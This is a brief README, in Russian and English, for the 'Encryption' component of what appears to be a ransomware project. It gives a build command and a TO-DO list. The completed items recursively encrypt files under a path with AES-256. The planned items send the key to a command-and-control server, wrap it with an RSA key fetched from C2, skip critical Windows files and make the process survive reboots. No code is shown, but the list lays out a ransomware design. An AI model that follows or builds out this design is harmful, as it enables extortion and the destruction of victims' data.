# Encryption

>Роль, ответственная за процесс шифрования.

Я не придумал параграф с описанием. 


## Содержание

1. [Использование](#использование)
2. [TO-DO](#to-do)


## Использование

```
git switch encryption && make
```


## TO-DO

- [x] **[MVP]** Генерация случайного ключа для шифрования
- [x] **[MVP]** Рекурсивный обход указанного пути и шифрование встречаемых файлов с использованием AES-256
- [ ] **[MVP]** Расшифровка файлов по указанному пути
- [ ] Assign each attack a unique ID
- [ ] Send AES to C2 upon finishing encryption
- [ ] Exchange attack ID for public RSA from C2
- [ ] Encrypt the AES with RSA before sending
- [ ] Blacklist critical Windows files for encryption
- [ ] Reboot-proof the process

